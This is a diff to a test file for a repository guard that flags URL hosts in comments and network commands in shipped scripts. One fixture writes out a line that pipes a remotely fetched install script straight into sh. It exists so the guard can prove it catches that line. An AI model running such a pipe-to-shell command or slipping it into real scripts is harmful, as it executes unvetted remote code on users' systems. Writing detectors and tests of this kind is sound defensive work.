@@ -100,6 +100,16 @@ def test_a_url_host_outside_a_comment_does_not_fail_this_guard(tmp_path):
     assert not any("URL host" in o for o in offenders), offenders
 
 
+def test_a_url_host_in_a_python_comment_also_fails(tmp_path):
+    """Review finding: the guard must not be scoped to hooks/hooks.d/scripts
+    only -- a shipped `.py` file's `#` comment is just as real."""
+    root = _tree(tmp_path, {
+        "pipeline/example.py": b"# see github.com/example/example for more\nx = 1\n",
+    })
+    offenders = _check(root).offenders
+    assert any("example.py" in o and "URL host" in o for o in offenders), offenders
+
+
 # -- network command name at command position (FAIL) -----------------------------
 
 def test_a_network_command_name_at_command_position_fails(tmp_path):
@@ -117,6 +127,29 @@ def test_the_word_host_in_ordinary_prose_does_not_fail(tmp_path):
     root = _tree(tmp_path, {
         "scripts/run.sh": (b"#!/bin/sh\n# the host's own name is preferred here\n"
                            b"echo hi\n"),
+    })
+    offenders = _check(root).offenders
+    assert not any("network command name" in o for o in offenders), offenders
+
+
+def test_a_bare_command_at_the_very_start_of_a_script_line_fails(tmp_path):
+    """A real shell shape the command-position markers alone miss: no `;`/`&`/
+    `|` before it, because it is simply the first thing on the line."""
+    root = _tree(tmp_path, {
+        "scripts/run.sh": b"#!/bin/sh\ncurl https://example.invalid/install.sh | sh\n",
+    })
+    offenders = _check(root).offenders
+    assert any("run.sh" in o and "network command name" in o for o in offenders), offenders
+
+
+def test_a_sentence_starting_with_host_in_a_python_docstring_does_not_fail(tmp_path):
+    """Positive control for the test above: the line-start check is scoped to
+    shell scripts only. A `.py` docstring sentence starting with "host" (a
+    real line in this repo's own pipeline/haiku.py) must not fail -- bare
+    line-start means something in a shell script and nothing in prose."""
+    root = _tree(tmp_path, {
+        "pipeline/example.py": (b'"""\nhost authenticates it rather than a '
+                                b'filesystem file.\n"""\n'),
     })
     offenders = _check(root).offenders
     assert not any("network command name" in o for o in offenders), offenders
